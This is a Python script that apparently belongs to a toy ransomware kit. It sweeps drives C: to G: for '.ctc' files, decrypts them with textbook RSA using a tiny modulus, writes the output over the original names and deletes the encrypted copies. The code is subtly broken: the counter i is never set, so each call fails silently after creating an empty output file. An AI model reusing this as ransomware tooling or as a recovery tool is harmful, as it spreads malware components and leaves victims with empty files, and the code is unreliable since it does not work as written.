import os
import fnmatch



def search_file(dirname):
    for dirpath, dirs, files in os.walk(dirname):
        if "Windows" not in dirpath:
            for fileName in files:
                if fnmatch.fnmatch(fileName, '*.ctc'):
                    try:
                        decrypt(os.path.join(dirpath, fileName))
                    except:
                        pass


def decrypt(file):
    with open(file, 'rb') as F:
        with open(file[:-4], 'wb') as F1:
            binStr = F.read()

            encStr = b''

            while i < len(binStr):
                data = (binStr[i] * 256) + binStr[i + 1]
                temp = ((data ** 6029) % 10403).to_bytes(1, byteorder='big')
                encStr += temp
                i = i + 2

            F1.write(encStr)
    os.remove(file)


rootdir_ = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/']
for _root in rootdir_:
    search_file(_root)
